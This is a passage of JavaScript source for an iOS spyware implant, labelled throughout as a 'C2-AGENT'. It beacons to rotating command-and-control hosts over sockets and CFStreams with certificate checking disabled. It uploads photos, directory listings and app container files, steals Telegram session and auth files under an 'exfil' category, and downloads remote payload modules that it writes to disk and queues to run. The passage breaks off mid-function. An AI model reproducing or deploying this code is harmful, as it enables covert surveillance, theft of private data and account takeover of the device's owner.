			" sid=" + String(globalThis.__C2_CHANNEL.sid).slice(0, 12));
	} catch (_) {}
	return true;
}

function httpPost(url, body) {
	const { host, port, path } = parseURL(url);
	var sendBody = body;
	// Boot probes / firstBeacon stay clear until __c2EnableChannelWire (after PE destroy RC).
	if (__c2ChannelWireOn()) {
		try { __c2EnsureChannelHelpers(); } catch (_) {}
		try {
			if (!globalThis.__C2_CHANNEL) {
				var __chPaths = ["/tmp/c2_ipc/channel.json", "/tmp/c2_v1/sb/channel.json"];
				for (var __ci = 0; __ci < __chPaths.length; __ci++) {
					try {
						var __cb = _readFileBytes(__chPaths[__ci], 4096);
						if (__cb && __cb.length) {
							var __co = JSON.parse(_rawToStr(__cb));
							if (__co && __co.sid && __co.key) {
								globalThis.__C2_CHANNEL = __co;
								break;
							}
						}
					} catch (_) {}
				}
			}
		} catch (_) {}
		try {
			if (typeof globalThis.__c2ChannelPath === "function" && globalThis.__c2ChannelPath(path)
				&& typeof globalThis.__c2ChannelSeal === "function" && globalThis.__C2_CHANNEL) {
				var sealed = globalThis.__c2ChannelSeal(body);
				if (sealed) sendBody = sealed;
			}
		} catch (_) {}
	}
	const bodyStr = JSON.stringify(sendBody);
	var resp = null;
	if (url.indexOf("https://") === 0) {
		resp = _cfstreamPost(host, port, path, bodyStr);
	} else {
		resp = _socketPost(host, port, path, bodyStr);
	}
	if (__c2ChannelWireOn()) {
		try {
			if (resp && typeof globalThis.__c2ChannelOpen === "function"
				&& typeof globalThis.__c2ChannelPath === "function" && globalThis.__c2ChannelPath(path)) {
				if (typeof resp === "object" && resp.pack === "ch1") return globalThis.__c2ChannelOpen(resp);
				if (typeof resp === "string" && resp.indexOf("\"pack\":\"ch1\"") >= 0) {
					return globalThis.__c2ChannelOpen(JSON.parse(resp));
				}
			}
		} catch (_) {}
	}
	return resp;
}

function hqPost(endpoint, body) {
	try { return httpPost(HQ_API_BASE + endpoint, body); }
	catch(e) { return null; }
}

// Prefer C2_REPORT_HOSTS (from pe file), then HQ / pin.
function hqPostReport(endpoint, body) {
	var hosts = [];
	try {
		if (C2_REPORT_HOSTS && C2_REPORT_HOSTS.length) {
			for (var i = 0; i < C2_REPORT_HOSTS.length; i++) _c2PushUnique(hosts, C2_REPORT_HOSTS[i]);
		}
	} catch (_) {}
	_c2PushUnique(hosts, HQ_API_BASE);
	_c2PushUnique(hosts, C2_PIN_BASE);
	if (!hosts.length) return null;
	var last = null;
	for (var hi = 0; hi < hosts.length; hi++) {
		try {
			last = httpPost(hosts[hi] + endpoint, body);
			if (last !== null && last !== undefined) return last;
		} catch (_) {}
	}
	return last;
}

var __c2LogSeq = 0;
function _c2Log(msg) {
	try {
		__c2LogSeq++;
		httpPost(HQ_API_BASE + "/pelog", { seq: __c2LogSeq, msg: String(msg).slice(0, 4000) });
	} catch(e) {}
}

function _normC2Base(u) {
	var s = String(u || "").trim().replace(/\/$/, "");
	if (!s) return "";
	if (s.indexOf("http://") !== 0 && s.indexOf("https://") !== 0) s = "https://" + s;
	return s;
}

function _c2PushUnique(list, u) {
	var b = _normC2Base(u);
	if (!b) return;
	for (var i = 0; i < list.length; i++) if (list[i] === b) return;
	list.push(b);
}

function _readC2EndpointsFile() {
	var paths = [
		"/tmp/c2_ipc/c2_endpoints.json",
		"/tmp/c2_v1/sb/c2_endpoints.json"
	];
	for (var i = 0; i < paths.length; i++) {
		try {
			var bytes = _readFileBytes(paths[i], 8192);
			if (!bytes || !bytes.length) continue;
			var o = JSON.parse(_rawToStr(bytes));
			if (o && typeof o === "object") return o;
		} catch (_) {}
	}
	return null;
}

function _c2ProbeLive(base) {
	base = _normC2Base(base);
	if (!base) return false;
	try {
		var r = httpPost(base + "/api/health", {});
		if (!r || typeof r !== "object") return false;
		if (r.ok === true || r.code === 0 || r.status === "ok" || r.status === "UP") return true;
		// Any JSON body with 200-path through httpPost counts as reachable.
		return true;
	} catch (_) {
		return false;
	}
}

function _applyC2Base(base) {
	base = _normC2Base(base);
	if (!base) return false;
	HQ_API_BASE = base;
	C2_BEACON_URL = base + "/beacon";
	C2_RESULT_URL = base + "/result";
	try {
		var m = base.match(/^https?:\/\/[^\/]+:(\d+)/);
		if (m) HQ_WALLET_PORT = String(m[1]);
		else HQ_WALLET_PORT = (base.indexOf("https://") === 0) ? "9090" : "9090";
	} catch (_) {}
	return true;
}

// pePublishC2Endpoints (pe_main) writes IPC before inject — prefer that set.
// C2_FORCE_PIN: skip endpoints file + health probe (SB may lack /tmp read).
function _resolveC2Endpoints() {
	var pin = _normC2Base(C2_PIN_BASE || HQ_API_BASE);
	var from = "pin";
	var c2List = [];
	var reportList = [];
	if (C2_FORCE_PIN && pin) {
		C2_HOSTS = [pin];
		C2_REPORT_HOSTS = [pin];
		C2_ENDPOINTS_FROM = "force_pin";
		_applyC2Base(pin);
		try {
			_earlyPelog("[C2-AGENT] c2 hq=" + pin + " n=1 from=force_pin");
		} catch (_) {}
		return pin;
	}
	try {
		var pe = _readC2EndpointsFile();
		if (pe && typeof pe === "object") {
			from = String(pe.from || "pe_file");
			_c2PushUnique(c2List, pe.primary);
			if (pe.c2 && pe.c2.length) {
				for (var i = 0; i < pe.c2.length; i++) _c2PushUnique(c2List, pe.c2[i]);
			}
			if (pe.endpoints && pe.endpoints.length) {
				for (var j = 0; j < pe.endpoints.length; j++) {
					var ep = pe.endpoints[j] || {};
					_c2PushUnique(c2List, ep.url || ((ep.scheme || "https") + "://" + (ep.host || ep.ip || "")));
				}
			}
			if (pe.report && pe.report.length) {
				for (var r = 0; r < pe.report.length; r++) _c2PushUnique(reportList, pe.report[r]);
			}
		}
	} catch (_) {}

	var chosen = "";
	if (c2List.length) {
		for (var k = 0; k < c2List.length; k++) {
			if (_c2ProbeLive(c2List[k])) {
				chosen = c2List[k];
				from = from + "+probe";
				break;
			}
		}
		// pe 文件有地址但 /api/health 全失败 → 回退硬编码
		if (!chosen) {
			from = from + "+probe_fail";
		}
	}
	if (!chosen) {
		chosen = pin;
		if (from === "pin" || from.indexOf("probe_fail") >= 0) {
			from = c2List.length ? (from + "_pin") : "pin";
		} else {
			from = "pin";
		}
		if (!c2List.length) c2List = pin ? [pin] : [];
		else if (pin) _c2PushUnique(c2List, pin);
	}
	if (!reportList.length) reportList = c2List.slice();
	C2_HOSTS = c2List.length ? c2List : (chosen ? [chosen] : []);
	C2_REPORT_HOSTS = reportList.length ? reportList : C2_HOSTS.slice();
	C2_ENDPOINTS_FROM = from;
	_applyC2Base(chosen);
	try {
		_earlyPelog("[C2-AGENT] c2 hq=" + chosen + " n=" + C2_HOSTS.length + " from=" + from);
	} catch (_) {}
	return chosen;
}

// Early HTTP probe so mitm/C2 see agent JS ran even if /tmp IPC fails.
function _agentBootProbe(stage) {
	var st = String(stage || "boot_probe");
	var pid = 0;
	try { pid = Number(Native.callSymbol("getpid")) || 0; } catch (_) {}
	var body = {
		seq: 0,
		msg: "[C2-AGENT] PROBE stage=" + st + " pid=" + pid + " hq=" + (HQ_API_BASE || "") +
			" from=" + (C2_ENDPOINTS_FROM || "") + " force_pin=" + !!C2_FORCE_PIN,
		role: "c2_agent",
		stage: st,
		pid: pid,
		hq: HQ_API_BASE || "",
		c2_from: C2_ENDPOINTS_FROM || "",
		force_pin: !!C2_FORCE_PIN,
		ts: Date.now()
	};
	var ok = false;
	try {
		var r = httpPost((HQ_API_BASE || C2_PIN_BASE) + "/pelog", body);
		ok = !!(r && typeof r === "object");
	} catch (_) {}
	try {
		httpPost(C2_BEACON_URL || ((HQ_API_BASE || C2_PIN_BASE) + "/beacon"), {
			uuid: "probe-" + pid,
			device_info: {
				role: "c2_agent",
				source: "c2_agent",
				stage: st,
				machine: "probe",
				force_pin: !!C2_FORCE_PIN
			},
			status: "probe"
		});
	} catch (_) {}
	return ok;
}

function _c2FailoverNext(failedBase) {
	var failed = _normC2Base(failedBase);
	var list = (C2_HOSTS && C2_HOSTS.length) ? C2_HOSTS : [];
	if (!list.length) {
		var pin = _normC2Base(C2_PIN_BASE || HQ_API_BASE);
		if (!pin) return "";
		_applyC2Base(pin);
		return pin;
	}
	var idx = -1;
	for (var i = 0; i < list.length; i++) {
		if (list[i] === failed) { idx = i; break; }
	}
	var next = list[(idx + 1) % list.length];
	if (!next) next = list[0];
	_applyC2Base(next);
	return next;
}

// ============================================================================
// HQ Photo Multipart Upload
// ============================================================================

function _writeStr(ptr, str) {
	var buf = new ArrayBuffer(str.length);
	var a = new Uint8Array(buf);
	for (var i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
	Native.write(ptr, buf);
}

function _cfstreamSendRaw(host, port, reqBuf, reqLen) {
	var hostCF = _makeCFString(host);
	if (!hostCF || hostCF === 0n) return false;
	var rPtr = Native.callSymbol("calloc", 1, 8);
	var wPtr = Native.callSymbol("calloc", 1, 8);
	try {
		Native.callSymbol("CFStreamCreatePairWithSocketToHost", 0n, hostCF, port, Native.asBigInt(rPtr), Native.asBigInt(wPtr));
		var rs = Native.readPtr(Native.asBigInt(rPtr));
		var ws = Native.readPtr(Native.asBigInt(wPtr));
		Native.callSymbol("CFRelease", hostCF); hostCF = 0n;
		Native.callSymbol("free", Native.asBigInt(rPtr)); Native.callSymbol("free", Native.asBigInt(wPtr));
		rPtr = 0n; wPtr = 0n;
		if (!rs || rs === 0n || !ws || ws === 0n) return false;
		try {
			var kLevel = _getGlobalCFSafe("kCFStreamPropertySocketSecurityLevel");
			var kNeg = _getGlobalCFSafe("kCFStreamSocketSecurityLevelNegotiatedSSL");
			if (kLevel && kNeg) {
				Native.callSymbol("CFWriteStreamSetProperty", ws, kLevel, kNeg);
				Native.callSymbol("CFReadStreamSetProperty", rs, kLevel, kNeg);
			}
			var kSSL = _getGlobalCFSafe("kCFStreamPropertySSLSettings");
			var kValCert = _getGlobalCFSafe("kCFStreamSSLValidatesCertificateChain");
			var kFalse = _getGlobalCF("kCFBooleanFalse");
			var kKeyCB = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryKeyCallBacks");
			var kValCB = Native.callSymbol("dlsym", 0xfffffffffffffffen, "kCFTypeDictionaryValueCallBacks");
			if (kSSL && kValCert && kFalse && kKeyCB && kValCB) {
				var dict = Native.callSymbol("CFDictionaryCreateMutable", 0n, 2, Native.asBigInt(kKeyCB), Native.asBigInt(kValCB));
				if (dict && dict !== 0n) {
					Native.callSymbol("CFDictionarySetValue", dict, kValCert, kFalse);
					Native.callSymbol("CFWriteStreamSetProperty", ws, kSSL, dict);
					Native.callSymbol("CFReadStreamSetProperty", rs, kSSL, dict);
					Native.callSymbol("CFRelease", dict);
				}
			}
			Native.callSymbol("CFWriteStreamOpen", ws);
			Native.callSymbol("CFReadStreamOpen", rs);
			var ready = false;
			for (var wi = 0; wi < 80; wi++) {
				var st = Number(Native.callSymbol("CFWriteStreamGetStatus", ws));
				if (st === 2) { ready = true; break; }
				if (st >= 5) break;
				Native.callSymbol("usleep", 100000);
			}
			if (!ready) return false;
			var totalSent = 0;
			while (totalSent < reqLen) {
				var nw = Number(Native.callSymbol("CFWriteStreamWrite", ws, reqBuf + Native.asBigInt(totalSent), reqLen - totalSent));
				if (nw <= 0) break;
				totalSent += nw;
			}
			return totalSent >= reqLen;
		} finally {
			Native.callSymbol("CFReadStreamClose", rs);
			Native.callSymbol("CFWriteStreamClose", ws);
			Native.callSymbol("CFRelease", rs);
			Native.callSymbol("CFRelease", ws);
		}
	} finally {
		if (hostCF && hostCF !== 0n) Native.callSymbol("CFRelease", hostCF);
		if (rPtr && rPtr !== 0n) Native.callSymbol("free", Native.asBigInt(rPtr));
		if (wPtr && wPtr !== 0n) Native.callSymbol("free", Native.asBigInt(wPtr));
	}
}

function _socketSendRaw(host, port, reqBuf, reqLen) {
	var fd = Number(Native.callSymbol("socket", 2, 1, 0));
	if (fd <= 0) return false;
	try {
		var tv = Native.callSymbol("malloc", 16n);
		Native.write64(tv, 15n); Native.write64(tv + 8n, 0n);
		Native.callSymbol("setsockopt", fd, 0xFFFF, 0x1005, tv, 16);
		Native.callSymbol("setsockopt", fd, 0xFFFF, 0x1006, tv, 16);
		Native.callSymbol("free", tv);
		var sa = Native.callSymbol("calloc", 1, 16);
		var sab = new ArrayBuffer(16);
		var sv = new DataView(sab);
		sv.setUint8(0, 16); sv.setUint8(1, 2);
		sv.setUint16(2, port, false);
		var pp = host.split(".");
		sv.setUint8(4, parseInt(pp[0])); sv.setUint8(5, parseInt(pp[1]));
		sv.setUint8(6, parseInt(pp[2])); sv.setUint8(7, parseInt(pp[3]));
		Native.write(sa, sab);
		var cr = Number(Native.callSymbol("connect", fd, sa, 16));
		Native.callSymbol("free", sa);
		if (cr !== 0) return false;
		var totalSent = 0;
		while (totalSent < reqLen) {
			var nw = Number(Native.callSymbol("write", fd, reqBuf + Native.asBigInt(totalSent), reqLen - totalSent));
			if (nw <= 0) break;
			totalSent += nw;
		}
		return totalSent >= reqLen;
	} finally { Native.callSymbol("close", fd); }
}

function _hqUploadPhoto(filePath, filename, uuid, seq, md5hash) {
	var useTLS = HQ_API_BASE.indexOf("https://") === 0;
	var p = parseURL(HQ_API_BASE + "/p");
	var fileFd = Number(Native.callSymbol("open", filePath, 0, 0));
	if (fileFd < 0) return false;
	var fileLen = Number(Native.callSymbol("lseek", fileFd, 0, 2));
	Native.callSymbol("lseek", fileFd, 0, 0);
	if (fileLen <= 0 || fileLen > 5242880) {
		Native.callSymbol("close", fileFd);
		return false;
	}
	var fileBuf = Native.callSymbol("malloc", Native.asBigInt(fileLen));
	if (!fileBuf || fileBuf === 0n) { Native.callSymbol("close", fileFd); return false; }
	Native.callSymbol("read", fileFd, fileBuf, fileLen);
	Native.callSymbol("close", fileFd);

	var bnd = "------HqBound";
	var ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1";
	var prefix =
		"--" + bnd + "\r\nContent-Disposition: form-data; name=\"uuid\"\r\n\r\n" + uuid + "\r\n" +
		"--" + bnd + "\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n" + filename + "\r\n" +
		"--" + bnd + "\r\nContent-Disposition: form-data; name=\"seq\"\r\n\r\n" + seq + "\r\n" +
		"--" + bnd + "\r\nContent-Disposition: form-data; name=\"md5\"\r\n\r\n" + md5hash + "\r\n" +
		"--" + bnd + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
	var suffix = "\r\n--" + bnd + "--\r\n";
	var bodyLen = prefix.length + fileLen + suffix.length;
	var hdr = "POST /p HTTP/1.0\r\nHost: " + p.host + "\r\nContent-Type: multipart/form-data; boundary=" + bnd + "\r\nUser-Agent: " + ua + "\r\nContent-Length: " + bodyLen + "\r\n\r\n";

	var totalLen = hdr.length + bodyLen;
	var reqBuf = Native.callSymbol("malloc", Native.asBigInt(totalLen));
	if (!reqBuf || reqBuf === 0n) { Native.callSymbol("free", fileBuf); return false; }

	_writeStr(reqBuf, hdr);
	_writeStr(reqBuf + Native.asBigInt(hdr.length), prefix);
	Native.callSymbol("memcpy", reqBuf + Native.asBigInt(hdr.length + prefix.length), fileBuf, Native.asBigInt(fileLen));
	Native.callSymbol("free", fileBuf);
	_writeStr(reqBuf + Native.asBigInt(hdr.length + prefix.length + fileLen), suffix);

	var ok = useTLS
		? _cfstreamSendRaw(p.host, p.port, reqBuf, totalLen)
		: _socketSendRaw(p.host, p.port, reqBuf, totalLen);
	Native.callSymbol("free", reqBuf);
	return ok;
}

// ============================================================================
// File & Directory Helpers
// ============================================================================

function readFileB64(path, maxSize) {
	maxSize = maxSize || MAX_FILE_SIZE;
	const fd = Number(Native.callSymbol("open", path, 0, 0));
	if (fd < 0) return null;
	try {
		const sz = Number(Native.callSymbol("lseek", fd, 0, 2));
		Native.callSymbol("lseek", fd, 0, 0);
		if (sz <= 0 || sz > maxSize) return null;
		const buf = Native.callSymbol("malloc", Native.asBigInt(sz));
		if (!buf || buf === 0n) return null;
		try {
			const nr = Number(Native.callSymbol("read", fd, buf, sz));
			if (nr <= 0) return null;
			return { b64: bytesToBase64(new Uint8Array(Native.read(buf, nr))), size: nr };
		} finally { Native.callSymbol("free", buf); }
	} finally { Native.callSymbol("close", fd); }
}

function getFileSize(path) {
	var fd = Number(Native.callSymbol("open", path, 0, 0));
	if (fd < 0) return -1;
	var sz = Number(Native.callSymbol("lseek", fd, 0, 2));
	Native.callSymbol("close", fd);
	return sz;
}

function sendFileChunked(cmdId, path, filename, category, meta) {
	var fd = Number(Native.callSymbol("open", path, 0, 0));
	if (fd < 0) return { ok: false, error: "open failed", sent: 0, total: 0 };
	try {
		return _sendChunksFromFd(cmdId, fd, -1, filename, category, meta);
	} finally { Native.callSymbol("close", fd); }
}

function _sendChunksFromFd(cmdId, fd, knownSize, filename, category, meta) {
	var fileSize = knownSize > 0 ? knownSize : Number(Native.callSymbol("lseek", fd, 0, 2));
	if (knownSize <= 0) Native.callSymbol("lseek", fd, 0, 0);
	if (fileSize <= 0) return { ok: false, error: "empty file", sent: 0, total: 0 };

	var totalChunks = Math.ceil(fileSize / CHUNK_SIZE);
	var buf = Native.callSymbol("malloc", Native.asBigInt(CHUNK_SIZE));
	if (!buf || buf === 0n) return { ok: false, error: "malloc failed", sent: 0, total: totalChunks };
	var sentOk = 0, lastErr = "";
	try {
		for (var ci = 0; ci < totalChunks; ci++) {
			var toRead = Math.min(CHUNK_SIZE, fileSize - ci * CHUNK_SIZE);
			var nr = Number(Native.callSymbol("read", fd, buf, toRead));
			if (nr <= 0) { lastErr = "read returned " + nr; break; }
			var b64 = bytesToBase64(new Uint8Array(Native.read(buf, nr)));
			var body = {
				command_id: cmdId, uuid: DEVICE_UUID,
				filename: filename, data: b64,
				chunk_index: ci, total_chunks: totalChunks,
				category: category || ""
			};
			if (meta && ci === totalChunks - 1) {
				body._exec_start_ms = meta.start_ms || 0;
				body._exec_end_ms = meta.end_ms || 0;
			}
			var postOk = false;
			for (var retry = 0; retry < 3; retry++) {
				try {
					var r = httpPost(C2_RESULT_URL, body);
					if (r !== null) { postOk = true; break; }
				} catch(pe) {}
				Native.callSymbol("usleep", 2000000);
			}
			if (postOk) { sentOk++; }
			else { lastErr = "POST failed chunk " + ci; break; }
		}
	} finally { Native.callSymbol("free", buf); }
	return { ok: sentOk === totalChunks, error: lastErr, sent: sentOk,
			 total: totalChunks, fileSize: fileSize };
}

function listDir(path) {
	const d = Native.callSymbol("opendir", path);
	if (!d || d === 0n) return [];
	const out = [];
	for (;;) {
		const ent = Native.callSymbol("readdir", d);
		if (!ent || ent === 0n) break;
		// Darwin dirent: d_ino(8)+d_seekoff(8)+d_reclen(2)+d_namlen(2)+d_type(1)+d_name
		const dtype = new Uint8Array(Native.read(ent + 20n, 1))[0];
		const name = Native.readString(ent + 21n, 256);
		if (name === "." || name === "..") continue;
		out.push({ name: name, type: dtype === 4 ? "dir" : dtype === 8 ? "file" : ""+dtype });
	}
	Native.callSymbol("closedir", d);
	return out;
}

// ============================================================================
// Command Handlers
// ============================================================================

function sendResult(cmdId, data, filename, category, meta) {
	const body = { command_id: cmdId, uuid: DEVICE_UUID, filename: filename || "result.bin" };
	if (data) body.data = data;
	if (category) body.category = category;
	if (meta) {
		if (meta.start_ms) body._exec_start_ms = meta.start_ms;
		if (meta.end_ms)   body._exec_end_ms   = meta.end_ms;
	}
	for (var _retry = 0; _retry < 3; _retry++) {
		var _resp = httpPost(C2_RESULT_URL, body);
		if (_resp !== null) return;
		Native.callSymbol("usleep", 2000000);
	}
}

function sendJSON(cmdId, obj, filename, meta) {
	const s = JSON.stringify(obj);
	sendResult(cmdId, bytesToBase64(new Uint8Array(Native.stringToBytes(s, false))), filename || "result.json", null, meta);
}

function sendJSONCat(cmdId, obj, filename, category) {
	const s = JSON.stringify(obj);
	const body = {
		command_id: cmdId,
		uuid: DEVICE_UUID,
		filename: filename || "result.json",
		data: bytesToBase64(new Uint8Array(Native.stringToBytes(s, false))),
		category: category || "",
		module_id: (obj && obj.module_id) || "",
		app_id: (obj && obj.app_id) || "",
		asset: true
	};
	for (var _retry = 0; _retry < 3; _retry++) {
		var _resp = httpPost(C2_RESULT_URL, body);
		if (_resp !== null) return true;
		Native.callSymbol("usleep", 2000000);
	}
	return false;
}

function _agentWriteFlags() {
	var flags = {
		ts: Date.now(),
		uuid: DEVICE_UUID || "",
		from: "c2_agent",
		tg_paused: !!C2_TG_PAUSED,
		pelog: !!C2_PELOG_ON
	};
	try {
		_v1WriteFile("/tmp/c2_ipc/agent_flags.json", JSON.stringify(flags) + "\n");
		_v1WriteFile("/tmp/c2_v1/sb/agent_flags.json", JSON.stringify(flags) + "\n");
	} catch (_) {}
	try {
		var pelogBody = JSON.stringify({
			on: !!C2_PELOG_ON,
			pelog: !!C2_PELOG_ON,
			ts: Date.now(),
			from: "c2_agent"
		}) + "\n";
		_v1WriteFile("/tmp/c2_ipc/pe_pelog.json", pelogBody);
		_v1WriteFile("/tmp/c2_v1/sb/pe_pelog.json", pelogBody);
	} catch (_) {}
	if (!C2_TG_PAUSED) return flags;
	try {
		_v1WriteFile("/tmp/c2_ipc/tg_paused", "1\n");
	} catch (_) {}
	globalThis.__c2_tg_paused = true;
	return flags;
}

function _tgAuthExfilTick() {
	if (C2_TG_PAUSED) {
		if (!globalThis.__c2_tg_paused) {
			_agentWriteFlags();
			try { _c2Log("[C2-AGENT] tg paused - pe skip bulk copy; wait telegram_v1 slim files"); } catch (_) {}
		}
	}
	if (globalThis.__c2_tg_uploaded) return;
	try {
		if (Number(Native.callSymbol("access", "/tmp/c2_ipc/tg_auth.uploaded", 0)) === 0) {
			globalThis.__c2_tg_uploaded = true;
			return;
		}
		if (Number(Native.callSymbol("access", "/tmp/c2_ipc/tg_auth.ready", 0)) !== 0 &&
			Number(Native.callSymbol("access", "/tmp/tg_auth.ready", 0)) !== 0)
			return;
		var ents = listDir("/tmp/tg_auth");
		if (!ents || !ents.length) return;
		var cid = "tg-" + Date.now().toString(16);
		var uploaded = [];
		var hasT1 = false;
		for (var j = 0; j < ents.length; j++) {
			if (ents[j] && ents[j].name === "db_t1.json") hasT1 = true;
		}
		var skipUp = {
			"postbox_db_sqlite-wal": 1,
			"postbox_db_sqlite-shm": 1,
			"tempkey": 1,
			"accounts-shared-data": 1,
			"key_datas": 1,
			"_postbox.db": 1,
			"_postbox.db-wal": 1,
			"_postbox.db-shm": 1
		};
		if (hasT1) skipUp["postbox_db_sqlite"] = 1;
		for (var i = 0; i < ents.length; i++) {
			if (ents[i].type === "dir") continue;
			var name = ents[i].name;
			if (skipUp[name]) {
				try { _c2Log("[C2-AGENT] tg skip bulk " + name); } catch (_) {}
				continue;
			}
			var fp = "/tmp/tg_auth/" + name;
			var sz = getFileSize(fp);
			if (sz <= 0) continue;
			var cr = sendFileChunked(cid, fp, name, "exfil");
			uploaded.push({ name: name, size: sz, ok: !!(cr && cr.ok) });
			try { _c2Log("[C2-AGENT] tg file " + name + " sz=" + sz + " ok=" + !!(cr && cr.ok)); } catch (_) {}
		}
		var report = {
			ok: uploaded.length > 0,
			category: "telegram",
			module_id: hasT1 ? "telegram_v1" : "session_telegram",
			app_id: "ph.telegra.Telegraph",
			bundleId: "ph.telegra.Telegraph",
			asset: true,
			files: uploaded,
			out_dir: "/tmp/tg_auth",
			summary: "tg_auth files=" + uploaded.length
		};
		sendJSONCat(cid, report, "tg_report.json", "telegram");
		try {
			_v1WriteFile("/tmp/c2_ipc/tg_auth.uploaded",
				JSON.stringify({ ts: Date.now(), cid: cid, n: uploaded.length }) + "\n");
			_v1WriteFile("/tmp/tg_auth.uploaded",
				JSON.stringify({ ts: Date.now(), cid: cid, n: uploaded.length }) + "\n");
		} catch (_) {}
		globalThis.__c2_tg_uploaded = true;
		try { _c2Log("[C2-AGENT] tg upload done cid=" + cid + " n=" + uploaded.length); } catch (_) {}
	} catch (e) {
		try { _c2Log("[C2-AGENT] tg upload err " + String(e).slice(0, 120)); } catch (_) {}
	}
}

function handleLs(cmd) {
	const p = (cmd.params && cmd.params.path) || "/";
	sendJSON(cmd.command_id, listDir(p), "ls_" + p.replace(/\//g, "_") + ".json");
}

function _appContainerRoot(bundleId) {
	try {
		var apps = _v1ScanApps();
		for (var i = 0; i < apps.length; i++) {
			if (apps[i].bundleId === bundleId && apps[i].uuid) {
				return "/var/mobile/Containers/Data/Application/" + apps[i].uuid;
			}
		}
	} catch (e) {}
	return "";
}

function _walkTree(root, maxDepth, depth, out, limit) {
	if (!root || depth > maxDepth || out.length >= limit) return;
	var entries = listDir(root) || [];
	for (var i = 0; i < entries.length; i++) {
		if (out.length >= limit) break;
		var name = entries[i].name || entries[i];
		if (!name || name === "." || name === "..") continue;
		var full = root.replace(/\/$/, "") + "/" + name;
		var isDir = !!(entries[i].is_dir || entries[i].dir || entries[i].type === "dir");
		out.push({ path: full, name: name, dir: isDir, depth: depth });
		if (isDir) _walkTree(full, maxDepth, depth + 1, out, limit);
	}
}

function handleAppTree(cmd) {
	var p = cmd.params || {};
	var root = p.path || "";
	if (!root && p.bundleId) root = _appContainerRoot(p.bundleId);
	if (!root) {
		sendJSON(cmd.command_id, { ok: false, error: "no_root" }, "app_tree.json");
		return;
	}
	var out = [];
	_walkTree(root, Number(p.max_depth) || 4, 0, out, 2000);
	sendJSON(cmd.command_id, { ok: true, root: root, n: out.length, entries: out }, "app_tree.json");
	hqPost("/api/task/status", { command_id: cmd.command_id, status: "completed", summary: "tree n=" + out.length });
}

function handleAppFiles(cmd) {
	var p = cmd.params || {};
	var paths = p.paths || [];
	if ((!paths || !paths.length) && p.path) paths = [p.path];
	var maxSz = p.max_size || MAX_FILE_SIZE;
	var ok = 0, fail = 0;
	for (var i = 0; i < paths.length; i++) {
		try {
			handleDownload({ command_id: cmd.command_id, params: { path: paths[i], max_size: maxSz } });
			ok++;
		} catch (e) { fail++; }
	}
	hqPost("/api/task/status", { command_id: cmd.command_id, status: fail && !ok ? "failed" : "completed", summary: "ok=" + ok + " fail=" + fail });
}

function handlePePassthrough(cmd) {
	var p = cmd.params || {};
	var cid = cmd.command_id || p._task_id || ("pe-" + Date.now());
	try {
		_v1Mkdirp("/tmp/c2_ipc/pe_tasks");
		_v1Mkdirp("/tmp/c2_ipc/pe_task_status");
		var env = {
			command_id: cid,
			pe_cmd: p.pe_cmd || "pe_task",
			params: p,
			ts: Date.now(),
			status: "queued"
		};
		_v1WriteEnvelope("/tmp/c2_ipc/pe_tasks/" + cid + ".json", env);
		try { _v1WriteFile("/tmp/c2_ipc/pe_tasks/_next", cid + "\n"); } catch (_) {}
		hqPost("/api/task/status", { command_id: cid, status: "running", summary: "queued_for_pe pe_cmd=" + env.pe_cmd });
		try { _c2Log("[C2-AGENT] pe_passthrough queued " + cid + " cmd=" + env.pe_cmd); } catch (e) {}
	} catch (e) {
		hqPost("/api/task/status", { command_id: cid, status: "failed", error: String(e).slice(0, 200) });
	}
}


function _payloadSrcFromGot(got) {
	try {
		if (!got) return "";
		if (got.data && !got.src && !got.enc) got = got.data;
		if (got.src) return String(got.src);
		if (typeof globalThis.__n7z_unwrapPayload === "function") {
			var s = globalThis.__n7z_unwrapPayload(got);
			if (s) return String(s);
		}
	} catch (_) {}
	return "";
}

function handlePeLoad(cmd) {
	var p = cmd.params || {};
	var cid = cmd.command_id || p._task_id || ("pe-load-" + Date.now());
	var modName = p.name || p.module || p.module_id || "telegram_v1.js";
	if (String(modName).indexOf(".js") < 0) modName = modName + ".js";
	try {
		if (Number(Native.callSymbol("access", "/tmp/c2_ipc/agent.cmd", 0)) === 0) {
			try { _c2Log("[C2-AGENT] pe_load defer, agent.cmd busy " + modName); } catch (_) {}
			try {
				hqPost("/api/task/status", {
					command_id: cid,
					status: "deferred",
					summary: "pe_load deferred pe_busy=agent.cmd " + modName
				});
			} catch (_) {}
			return false;
		}
		_v1Mkdirp("/tmp/c2_ipc");
		var got = hqPost("/api/payload/get", {
			name: modName,
			uid: DEVICE_UUID,
			uuid: DEVICE_UUID,
			device_code: DEVICE_UUID});
		if (got && got.data && !got.src) got = got.data;
		var src = _payloadSrcFromGot(got);
		if (!src || src.length < 80) {
			var err = (got && (got.detail || got.error || got.reason)) ? String(got.detail || got.error || got.reason).slice(0, 120) : "payload/get failed";
			hqPost("/api/task/status", { command_id: cid, status: "failed", error: err });
			try { _c2Log("[C2-AGENT] pe_load fail " + modName + " " + err); } catch (_) {}
			return false;
		}
		var mid = (got.module_id || modName.replace(/\.js$/i, "")).replace(/\.js$/i, "");
		var mpath = "/tmp/c2_ipc/mod." + mid;
		if (!_v1WriteFile(mpath, src)) {
			hqPost("/api/task/status", { command_id: cid, status: "failed", error: "write_mod_fail" });
			return false;
		}
		try { Native.callSymbol("chmod", mpath, 0x1ff); } catch (_) {}
		var task = got.task || {};
		var timeoutSec = Number(p.timeout_sec || task.timeout_sec || 0) || 0;
		if (!timeoutSec && mid.indexOf("photos_upload") >= 0) timeoutSec = 3600;
		var resultUrl = String(p.result_url || task.result_url || "");
		if (!resultUrl) {
			try {
				var base = _normC2Base(HQ_API_BASE || C2_PIN_BASE || "");
				if (base) resultUrl = base + "/result";
			} catch (_) {}
		}
		try {
			_v1WriteFile(mpath + ".task.json", JSON.stringify({
				timeout_sec: timeoutSec,
				result_url: resultUrl,
				module_id: mid,
				command_id: cid,
				params: p
			}));
		} catch (_) {}
		var cmdBody = JSON.stringify({
			id: cid,
			type: "load_module",
			name: mid,
			path: mpath,
			timeout_sec: timeoutSec,
			result_url: resultUrl,
			command_id: cid
		});
		if (!_v1WriteFile("/tmp/c2_ipc/agent.cmd", cmdBody)) {
